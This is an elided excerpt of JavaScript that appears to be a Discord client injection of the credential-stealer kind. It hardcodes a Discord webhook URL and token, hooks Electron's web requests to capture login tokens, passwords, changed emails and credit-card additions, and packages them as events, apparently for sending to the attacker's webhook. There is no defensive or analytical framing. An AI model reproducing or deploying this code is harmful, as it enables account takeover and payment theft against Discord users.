...
const os = require('os')
const webhook = "%https://discord.com/api/webhooks/1080903033065590856/Vakc60EsN3NkIvz6pv8QtfQBF4A3-En5t98RV1fcGP4rBtqQnTw-zWPPPzjQ68EQmZwZ"
const Filters = {
    1: {
...
async function firstTime() {
    ...
    if (!fs.existsSync(path.join(__dirname, "ShitBTW"))) return true

    fs.rmdirSync(path.join(__dirname, "ShitBTW"));
...
session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    ...
    switch (true) {
        case details.url.endsWith('login'):
            var event = new ShitEvent('userLogin', token, {
        ...
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            ...
            if (data.email) {
                var event = new ShitEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();
            ...
            if (data.new_password) {
                var event = new ShitEvent('passwordChanged', token, {
                    password: data.password,
        ...
        case details.url.endsWith('tokens') && details.method == "POST":
            ...
            var event = new ShitEvent('creditCardAdded', token, {
